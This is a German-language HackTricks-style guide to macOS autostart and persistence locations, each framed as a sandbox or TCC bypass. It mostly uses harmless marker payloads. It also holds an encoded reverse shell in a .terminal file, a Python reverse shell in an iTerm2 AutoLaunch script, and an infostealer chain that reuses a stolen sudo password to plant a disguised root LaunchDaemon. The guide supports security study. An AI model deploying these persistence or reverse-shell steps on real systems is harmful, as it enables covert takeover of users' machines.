# macOS Autostart

{{#include ../banners/hacktricks-training.md}}

Dieser Abschnitt basiert hauptsächlich auf der Blogserie [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/), das Ziel ist, **mehr Autostart-Orte** (falls möglich) hinzuzufügen, anzugeben, **welche Techniken heutzutage mit der aktuellen macOS-Version (13.4) noch funktionieren** und die **benötigten Berechtigungen** zu spezifizieren.

## Sandbox Bypass

> [!TIP]
> Hier findest du Startorte, die für **sandbox bypass** nützlich sind und es dir erlauben, etwas einfach auszuführen, indem du es **in eine Datei schreibst** und **wartest** auf eine sehr **häufige** **Aktion**, eine bestimmte **Zeitspanne** oder eine **Aktion, die du üblicherweise aus einer Sandbox heraus ausführen kannst**, ohne Root-Rechte zu benötigen.

### Launchd

- Useful to bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **Auslöser**: Neustart
- Root erforderlich
- **`/Library/LaunchDaemons`**
- **Auslöser**: Neustart
- Root erforderlich
- **`/System/Library/LaunchAgents`**
- **Auslöser**: Neustart
- Root erforderlich
- **`/System/Library/LaunchDaemons`**
- **Auslöser**: Neustart
- Root erforderlich
- **`~/Library/LaunchAgents`**
- **Auslöser**: Neu-Anmeldung
- **`~/Library/LaunchDemons`**
- **Auslöser**: Neu-Anmeldung

> [!TIP]
> Als interessante Tatsache hat **`launchd`** eine eingebettete Property List im Mach-O-Abschnitt `__Text.__config`, die andere bekannte Services enthält, die launchd starten muss. Darüber hinaus können diese Dienste die Flags `RequireSuccess`, `RequireRun` und `RebootOnSuccess` enthalten, was bedeutet, dass sie ausgeführt werden und erfolgreich abgeschlossen werden müssen.
>
> Natürlich kann sie wegen code signing nicht modifiziert werden.

#### Beschreibung & Ausnutzung

**`launchd`** ist der **erste** **Prozess**, der vom OX S Kernel beim Start ausgeführt wird, und der letzte, der beim Herunterfahren beendet wird. Er sollte immer die **PID 1** haben. Dieser Prozess wird die in den **ASEP** **plists** angegebenen Konfigurationen lesen und ausführen in:

- `/Library/LaunchAgents`: Per-User Agents, die vom Administrator installiert wurden
- `/Library/LaunchDaemons`: Systemweite Daemons, die vom Administrator installiert wurden
- `/System/Library/LaunchAgents`: Per-User Agents, die von Apple bereitgestellt werden
- `/System/Library/LaunchDaemons`: Systemweite Daemons, die von Apple bereitgestellt werden

Wenn sich ein Benutzer anmeldet, werden die plists in `/Users/$USER/Library/LaunchAgents` und `/Users/$USER/Library/LaunchDemons` mit den **Berechtigungen des angemeldeten Benutzers** gestartet.

Der **Hauptunterschied zwischen agents und daemons ist, dass agents geladen werden, wenn sich der Benutzer anmeldet, und daemons beim Systemstart geladen werden** (da es Dienste wie ssh gibt, die vor jeglichem Benutzerzugriff auf das System ausgeführt werden müssen). Außerdem können agents eine GUI nutzen, während daemons im Hintergrund laufen müssen.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Es gibt Fälle, in denen ein **Agent vor der Benutzeranmeldung ausgeführt werden muss**, diese werden **PreLoginAgents** genannt. Zum Beispiel ist dies nützlich, um beim Login Assistive-Technologie bereitzustellen. Sie können auch in `/Library/LaunchAgents` gefunden werden (siehe [**here**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) ein Beispiel).

> [!TIP]
> Neue Daemons- oder Agents-Konfigurationsdateien werden **nach dem nächsten Neustart oder durch** `launchctl load <target.plist>` **geladen**. Es ist **auch möglich, .plist-Dateien ohne diese Erweiterung zu laden** mit `launchctl -F <file>` (diese plist-Dateien werden jedoch nach einem Neustart nicht automatisch geladen).\
> Es ist auch möglich, mit `launchctl unload <target.plist>` **zu entladen** (der durch sie referenzierte Prozess wird beendet),
>
> Um **sicherzustellen**, dass nicht **etwas** (wie ein Override) **verhindert**, dass ein **Agent** oder **Daemon** **läuft**, führen Sie aus: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`

Alle Agents und Daemons auflisten, die vom aktuellen Benutzer geladen wurden:
```bash
launchctl list
```
#### Beispielhafte bösartige LaunchDaemon-Kette (Passwort-Wiederverwendung)

Ein aktueller macOS-Infostealer hat ein **erbeutetes sudo-Passwort** wiederverwendet, um einen User-Agent und einen root LaunchDaemon abzulegen:

- Schreibe die Agentenschleife nach `~/.agent` und mache sie ausführbar.
- Erzeuge eine plist in `/tmp/starter`, die auf diesen Agenten zeigt.
- Verwende das gestohlene Passwort erneut mit `sudo -S`, um die plist nach `/Library/LaunchDaemons/com.finder.helper.plist` zu kopieren, `root:wheel` zu setzen und sie mit `launchctl load` zu laden.
- Starte den Agenten stillschweigend via `nohup ~/.agent >/dev/null 2>&1 &`, um die Ausgabe zu entkoppeln.
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Wenn eine plist einem Benutzer gehört, selbst wenn sie in systemweiten daemon-Ordnern liegt, wird die **Aufgabe als der Benutzer ausgeführt** und nicht als root. Das kann einige Privilege-Escalation-Angriffe verhindern.

#### More info about launchd

**`launchd`** ist der **erste** User-Mode-Prozess, der vom **Kernel** gestartet wird. Der Prozessstart muss **erfolgreich** sein und er **darf nicht exits oder crashen**. Er ist sogar gegen einige **Killing-Signale** geschützt.

Eines der ersten Dinge, die `launchd` tut, ist das **Starten** aller **daemons**, wie zum Beispiel:

- **Timer daemons** basierend auf einer Ausführungszeit:
- atd (`com.apple.atrun.plist`): Hat ein `StartInterval` von 30min
- crond (`com.apple.systemstats.daily.plist`): Hat `StartCalendarInterval`, um um 00:15 zu starten
- **Network daemons** wie:
- `org.cups.cups-lpd`: Lauscht auf TCP (`SockType: stream`) mit `SockServiceName: printer`
- SockServiceName muss entweder ein Port oder ein Service aus `/etc/services` sein
- `com.apple.xscertd.plist`: Lauscht auf TCP Port 1640
- **Path daemons**, die ausgeführt werden, wenn ein spezifizierter Pfad sich ändert:
- `com.apple.postfix.master`: Überwacht den Pfad `/etc/postfix/aliases`
- **IOKit notifications daemons**:
- `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
- `com.apple.xscertd-helper.plist`: Gibt im `MachServices`-Eintrag den Namen `com.apple.xscertd.helper` an
- **UserEventAgent:**
- Das unterscheidet sich vom vorherigen. Es veranlasst launchd, Apps als Reaktion auf spezifische Events zu starten. In diesem Fall ist der Haupt-Binary nicht `launchd`, sondern `/usr/libexec/UserEventAgent`. Er lädt Plugins aus dem SIP-restriktierten Ordner /System/Library/UserEventPlugins/, wobei jedes Plugin seinen Initialisierer im `XPCEventModuleInitializer`-Key angibt oder — im Fall älterer Plugins — im `CFPluginFactories`-Dict unter dem Key `FB86416D-6164-2070-726F-70735C216EC0` seiner `Info.plist`.

### shell startup files

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
- Aber man muss eine App finden, die einen TCC bypass hat und eine Shell ausführt, die diese Dateien lädt

#### Locations

- **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
- **Trigger**: Terminal mit zsh öffnen
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
- **Trigger**: Terminal mit zsh öffnen
- Root erforderlich
- **`~/.zlogout`**
- **Trigger**: Terminal mit zsh beenden
- **`/etc/zlogout`**
- **Trigger**: Terminal mit zsh beenden
- Root erforderlich
- Möglicherweise mehr in: **`man zsh`**
- **`~/.bashrc`**
- **Trigger**: Terminal mit bash öffnen
- `/etc/profile` (funktionierte nicht)
- `~/.profile` (funktionierte nicht)
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
- **Trigger**: Erwartet, mit xterm ausgelöst zu werden, aber xterm **ist nicht installiert** und selbst nach der Installation wird folgender Fehler ausgegeben: xterm: `DISPLAY is not set`

#### Description & Exploitation

Beim Starten einer Shell-Umgebung wie `zsh` oder `bash` werden **bestimmte Startup-Dateien ausgeführt**. macOS verwendet derzeit `/bin/zsh` als Standard-Shell. Diese Shell wird automatisch aufgerufen, wenn die Terminal-Anwendung gestartet wird oder wenn ein Gerät per SSH erreicht wird. Während `bash` und `sh` ebenfalls auf macOS vorhanden sind, müssen sie explizit aufgerufen werden, um verwendet zu werden.

Die Manpage von zsh, die man mit **`man zsh`** lesen kann, enthält eine ausführliche Beschreibung der Startup-Dateien.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Wieder geöffnete Anwendungen

> [!CAUTION]
> Das Konfigurieren der beschriebenen exploitation sowie Aus- und wieder Einloggen oder sogar ein Neustart führten bei mir nicht dazu, dass die App ausgeführt wurde. (Die App wurde nicht gestartet; möglicherweise muss sie laufen, während diese Aktionen durchgeführt werden.)

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)

- Nützlich, um die sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **Auslöser**: Neustart — Anwendungen werden wieder geöffnet

#### Beschreibung & Exploitation

Alle Anwendungen, die wieder geöffnet werden, befinden sich in der plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Füge also beim Wiederöffnen deine eigene Anwendung hinzu — du musst **deine App zur Liste hinzufügen**.

Die UUID findet man, indem man dieses Verzeichnis auflistet oder mit `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Um die Anwendungen zu prüfen, die wieder geöffnet werden, kannst du Folgendes tun:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Um **eine Anwendung zu dieser Liste hinzuzufügen**, können Sie Folgendes verwenden:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal-Einstellungen

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC-Bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal besitzt oft die FDA-Berechtigungen des Benutzers, wenn dieser es verwendet

#### Ort

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **Auslöser**: Terminal öffnen

#### Beschreibung & Ausnutzung

In **`~/Library/Preferences`** werden die Präferenzen des Benutzers für Anwendungen gespeichert. Einige dieser Präferenzen können eine Konfiguration enthalten, um **andere Anwendungen/Skripte auszuführen**.

Zum Beispiel kann Terminal beim Start einen Befehl ausführen:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Diese Konfiguration spiegelt sich in der Datei **`~/Library/Preferences/com.apple.Terminal.plist`** wie folgt wider:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Wenn die plist der Einstellungen des terminal im System überschrieben werden könnte, kann die `open`-Funktionalität verwendet werden, um das terminal zu öffnen und der Befehl wird ausgeführt.

Du kannst das von der cli aus hinzufügen mit:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal-Skripte / Andere Dateierweiterungen

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal verwendet die FDA-Berechtigungen des Benutzers, der es benutzt

#### Location

- **Überall**
- **Auslöser**: Terminal öffnen

#### Description & Exploitation

If you create a [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) and opens, the **Terminal application** will be automatically invoked to execute the commands indicated in there. If the Terminal app has some special privileges (such as TCC), your command will be run with those special privileges.

Probiere es mit:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
Sie können auch die Erweiterungen **`.command`**, **`.tool`** mit normalen Shell-Skript-Inhalten verwenden; diese werden ebenfalls von Terminal geöffnet.

> [!CAUTION]
> Wenn Terminal **Full Disk Access** hat, kann es diese Aktion ausführen (beachte, dass der ausgeführte Befehl in einem Terminalfenster sichtbar sein wird).

### Audio-Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Sie könnten zusätzlichen TCC-Zugriff erhalten

#### Ort

- **`/Library/Audio/Plug-Ins/HAL`**
- Root erforderlich
- **Auslöser**: Restart coreaudiod or the computer
- **`/Library/Audio/Plug-ins/Components`**
- Root erforderlich
- **Auslöser**: Restart coreaudiod or the computer
- **`~/Library/Audio/Plug-ins/Components`**
- **Auslöser**: Restart coreaudiod or the computer
- **`/System/Library/Components`**
- Root erforderlich
- **Auslöser**: Restart coreaudiod or the computer

#### Beschreibung

Laut den vorherigen Writeups ist es möglich, **einige Audio-Plugins zu kompilieren** und laden zu lassen.

### QuickLook-Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Sie könnten zusätzlichen TCC-Zugriff erhalten

#### Ort

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Beschreibung & Exploitation

QuickLook-Plugins können ausgeführt werden, wenn Sie die **Vorschau einer Datei auslösen** (Leertaste drücken, während die Datei im Finder ausgewählt ist) und ein **Plugin, das diesen Dateityp unterstützt**, installiert ist.

Es ist möglich, ein eigenes QuickLook-Plugin zu kompilieren, es in einen der oben genannten Orte zu legen, sodass es geladen wird, und dann zu einer unterstützten Datei zu gehen und die Leertaste zu drücken, um es auszulösen.

### ~~Login/Logout Hooks~~

> [!CAUTION]
> Das hat bei mir nicht funktioniert, weder mit dem Benutzer LoginHook noch mit dem root LogoutHook

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Ort

- Sie müssen in der Lage sein, etwas auszuführen wie `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
- `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

Sie sind veraltet, können aber verwendet werden, um Befehle auszuführen, wenn sich ein Benutzer anmeldet.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Diese Einstellung wird in `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` gespeichert.
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Um es zu löschen:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Die für den root-Benutzer gespeicherte Datei befindet sich in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> Hier findest du Startpfade, die für **sandbox bypass** nützlich sind und es erlauben, etwas einfach auszuführen, indem du es **in eine Datei schreibst** und auf nicht sehr häufige Bedingungen wie bestimmte **installierte Programme**, "ungewöhnliche" Benutzeraktionen oder Umgebungen wartest.

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)

- Nützlich für sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
- Allerdings musst du das `crontab`-Binary ausführen können
- Oder root sein
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherorte

- **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
- Root erforderlich für direkten Schreibzugriff. Kein Root erforderlich, wenn du `crontab <file>` ausführen kannst
- **Trigger**: Hängt vom cron-Job ab

#### Beschreibung & Exploitation

Liste die cron-Jobs des **aktuellen Benutzers** mit:
```bash
crontab -l
```
Sie können außerdem alle Cron-Jobs der Benutzer in **`/usr/lib/cron/tabs/`** und **`/var/at/tabs/`** sehen (erfordert Root).

In MacOS können mehrere Ordner, die Skripte mit **bestimmter Häufigkeit** ausführen, gefunden werden:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Dort findest du die regulären **cron** **jobs**, die **at** **jobs** (nicht sehr verbreitet) und die **periodic** **jobs** (hauptsächlich zum Bereinigen temporärer Dateien). Die täglich ausgeführten periodic-Jobs können zum Beispiel mit: `periodic daily` ausgeführt werden.

Um einen **user cronjob programatically** hinzuzufügen, kannst du Folgendes verwenden:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC-Bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 hatte früher TCC-Berechtigungen

#### Standorte

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **Auslöser**: iTerm öffnen
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **Auslöser**: iTerm öffnen
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **Auslöser**: iTerm öffnen

#### Beschreibung & Exploitation

Skripte, die in **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** gespeichert sind, werden ausgeführt. Zum Beispiel:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
oder:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Das Skript **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** wird ebenfalls ausgeführt:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Die iTerm2-Voreinstellungen in **`~/Library/Preferences/com.googlecode.iterm2.plist`** können **einen auszuführenden Befehl angeben**, wenn das iTerm2-Terminal geöffnet wird.

Diese Einstellung kann in den iTerm2-Einstellungen konfiguriert werden:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Und der Befehl wird in den Voreinstellungen angezeigt:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Sie können den auszuführenden Befehl festlegen mit:
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> Es ist sehr wahrscheinlich, dass es weitere Möglichkeiten gibt, die iTerm2-Preferences zu missbrauchen, um beliebige Befehle auszuführen.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)

- Nützlich, um die sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- Aber xbar muss installiert sein
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Es verlangt Accessibility-Berechtigungen

#### Location

- **`~/Library/Application\ Support/xbar/plugins/`**
- **Trigger**: Sobald xbar ausgeführt wird

#### Description

Wenn das populäre Programm [**xbar**](https://github.com/matryer/xbar) installiert ist, ist es möglich, ein shell script in **`~/Library/Application\ Support/xbar/plugins/`** zu schreiben, das ausgeführt wird, wenn xbar gestartet wird:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- Aber Hammerspoon muss installiert sein
- TCC-Bypass: [✅](https://emojipedia.org/check-mark-button)
- Es fordert Accessibility-Berechtigungen an

#### Speicherort

- **`~/.hammerspoon/init.lua`**
- **Auslöser**: Sobald hammerspoon ausgeführt wird

#### Beschreibung

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) dient als Automatisierungsplattform für **macOS** und nutzt die **LUA-Skriptsprache** für seine Abläufe. Bemerkenswert ist die Unterstützung zur Integration von vollständigem AppleScript-Code und zur Ausführung von Shell-Skripten, was die Skripting-Fähigkeiten deutlich erweitert.

Die App sucht nach einer einzelnen Datei, `~/.hammerspoon/init.lua`, und beim Start wird das Skript ausgeführt.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- Nützlich, um sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- Aber BetterTouchTool muss installiert sein
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Es fordert Automation-Shortcuts und Accessibility-Berechtigungen an

#### Location

- `~/Library/Application Support/BetterTouchTool/*`

Dieses Tool erlaubt anzugeben, welche Anwendungen oder Skripte ausgeführt werden sollen, wenn bestimmte Shortcuts gedrückt werden. Ein Angreifer könnte in der Lage sein, seinen eigenen **Shortcut und die auszuführende Aktion in der Datenbank** zu konfigurieren, um beliebigen Code auszuführen (ein Shortcut könnte z. B. einfach das Drücken einer Taste sein).

### Alfred

- Nützlich, um sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- Aber Alfred muss installiert sein
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Es fordert Automation, Accessibility und sogar Full-Disk access-Berechtigungen an

#### Location

- `???`

Es ermöglicht das Erstellen von Workflows, die Code ausführen können, wenn bestimmte Bedingungen erfüllt sind. Möglicherweise kann ein Angreifer eine Workflow-Datei erstellen und Alfred dazu bringen, sie zu laden (für Workflows ist die Premium-Version erforderlich).

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)

- Nützlich, um sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- Aber ssh muss aktiviert und verwendet werden
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH hatte früher Full-Disk access

#### Location

- **`~/.ssh/rc`**
- **Trigger**: Anmeldung via ssh
- **`/etc/ssh/sshrc`**
- Root erforderlich
- **Trigger**: Anmeldung via ssh

> [!CAUTION]
> To turn ssh on requres Full Disk Access:
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### Description & Exploitation

Standardmäßig, sofern nicht `PermitUserRC no` in `/etc/ssh/sshd_config` gesetzt ist, werden beim Login eines Nutzers via SSH die Skripte **`/etc/ssh/sshrc`** und **`~/.ssh/rc`** ausgeführt.

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)

- Nützlich, um sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- Aber Sie müssen `osascript` mit args ausführen
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **Trigger:** Anmeldung
- Exploit-Payload gespeichert; ruft `osascript` auf
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **Trigger:** Anmeldung
- Root erforderlich

#### Description

In Systemeinstellungen -> Benutzer & Gruppen -> Anmeldeobjekte finden Sie Elemente, die beim Anmelden des Benutzers ausgeführt werden.\
Es ist möglich, diese über die Kommandozeile aufzulisten, hinzuzufügen und zu entfernen:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Diese Einträge werden in der Datei **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** gespeichert

**Login-Objekte** können **auch** über die API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) angegeben werden, die die Konfiguration in **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** speichert

### ZIP als Login-Objekt

(Siehe vorheriger Abschnitt über Login-Objekte, dies ist eine Erweiterung)

Wenn Sie eine **ZIP**-Datei als **Login-Objekt** speichern, wird das **`Archive Utility`** sie öffnen. Wenn die ZIP-Datei z. B. in **`~/Library`** gespeichert war und den Ordner **`LaunchAgents/file.plist`** mit einer backdoor enthielt, wird dieser Ordner erstellt (er existiert nicht standardmäßig) und die plist wird hinzugefügt, sodass beim nächsten Login des Benutzers die **in der plist angegebene backdoor ausgeführt wird**.

